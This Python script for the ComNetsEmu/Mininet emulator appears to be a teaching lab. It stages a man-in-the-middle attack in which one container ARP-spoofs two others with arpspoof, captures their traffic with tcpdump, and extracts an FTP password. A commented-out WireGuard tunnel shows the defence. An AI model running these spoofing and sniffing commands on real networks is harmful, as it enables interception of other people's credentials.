#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8

"""
About: Basic example of using Docker as a Mininet host
"""

import comnetsemu.tool as tool
from comnetsemu.net import Containernet
from time import sleep
from mininet.link import TCLink
from mininet.log import info, setLogLevel
from mininet.node import Controller
from mininet.util import dumpNodeConnections

PING_COUNT = 15


def testTopo():
    "Create an empty network and add nodes to it."

    net = Containernet(controller=Controller, link=TCLink)

    info('*** Adding controller\n')
    net.addController('c0')

    info('*** Adding hosts\n')
    h1 = net.addDockerHost('h1', dimage='sec_test', ip='10.0.0.1', cpuset_cpus="1", cpu_quota=25000)
    h2 = net.addDockerHost('h2', dimage='sec_test', ip='10.0.0.2', cpuset_cpus="1", cpu_quota=25000)
    h3 = net.addDockerHost('h3', dimage='sec_test', ip='10.0.0.3', cpuset_cpus="0", cpu_quota=25000)

    info('*** Adding switch\n')
    s1 = net.addSwitch('s1')

    info('*** Creating links\n')
    net.addLinkNamedIfce(s1, h1, bw=10, delay='1ms', use_htb=True)
    net.addLinkNamedIfce(s1, h2, bw=10, delay='1ms', use_htb=True)
    net.addLinkNamedIfce(s1, h3, bw=10, delay='1ms', use_htb=True)

    info('*** Starting network\n')
    net.start()

    info('*** Attacker, Client and Server setup\n')
    h1.cmd("ping -c 10 10.0.0.2")
    h3.cmd("printf -- '#!/bin/bash\narpspoof -i h3-s1 -t 10.0.0.1 10.0.0.2 >> /dev/null &\narpspoof -i h3-s1 -t 10.0.0.2 10.0.0.1 >> /dev/null &' > spoof.sh; chmod +x spoof.sh; ./spoof.sh")
    sleep(10)
    h3.cmd('tcpdump -vvv -i h3-s1 -B 100000 ip >> messages.log &')
    sleep(10)
    h2.cmd("mkdir -p /var/run/vsftpd/empty")
    h2.cmd("vsftpd &")

    # Setup a tunnel to protect the ftp request from the MitM attacker!
    # You can use test_connection to verify that the tunnel was established.
    '''
    info('*** Create wg key pairs\n')
    h1.cmd("umask 077; wg genkey > privatekey")
    h1.cmd("wg pubkey < privatekey > publickey")
    h1_pubkey = h1.cmd("cat ./publickey").replace('\n', ' ').replace('\r', '')

    h2.cmd("umask 077; wg genkey > privatekey")
    h2.cmd("wg pubkey < privatekey > publickey")
    h2_pubkey = h2.cmd("cat ./publickey").replace('\n', ' ').replace('\r', '')

    info('*** Create wg interfaces\n')
    h1.cmd("ip link add dev wg0 type wireguard")
    h1.cmd("ip address add dev wg0 192.168.0.1/24")

    h2.cmd("ip link add dev wg0 type wireguard")
    h2.cmd("ip address add dev wg0 192.168.0.2/24")

    info('*** Setup peer configuration\n')
    h1.cmd("wg set wg0 listen-port 1337 private-key ./privatekey peer {} allowed-ips 192.168.0.0/24 endpoint 10.0.0.2:1337".format(h2_pubkey))
    h1.cmd("ip link set up dev wg0")

    h2.cmd("wg set wg0 listen-port 1337 private-key ./privatekey peer {} allowed-ips 192.168.0.0/24 endpoint 10.0.0.1:1337".format(h1_pubkey))
    h2.cmd("ip link set up dev wg0")'''

    test_connection(h1, "10.0.0.2")
    login_at_ftp_server(h1, "10.0.0.2")

    info('*** Extract Passwords\n')
    sleep(20)
    output = h3.cmd('cat messages.log')
    password_found = False
    for line in output.split("\n"):
        if "PASS" in line:
            password_found = True
            info('*** Found password: ' + line + '\n')

    if not password_found:
        info('*** No password found!\n')

    info('*** Stopping network\n')
    net.stop()


def login_at_ftp_server(client_container, ftp_server_ip):
    info('*** Login into ftp server\n')
    # Do a correct login...
    print(client_container.cmd(
        "printf -- '#!/bin/bash \n ftp -i -n " + ftp_server_ip + " <<EOF\n user root hunter2 \nEOF\n' > login.sh && chmod +x login.sh && ./login.sh"))


def test_connection(source_container, target_ip):
    info("*** Test the connection\n")
    info("* Ping test count: %d" % PING_COUNT)
    ret = source_container.cmd("ping -c " + str(PING_COUNT) + " " + target_ip)
    sent, received = tool.parsePing(ret)
    measured = ((sent - received) / float(sent)) * 100.0
    info("* Measured loss rate: {:.2f}%\n".format(measured))


if __name__ == '__main__':
    setLogLevel('info')
    testTopo()
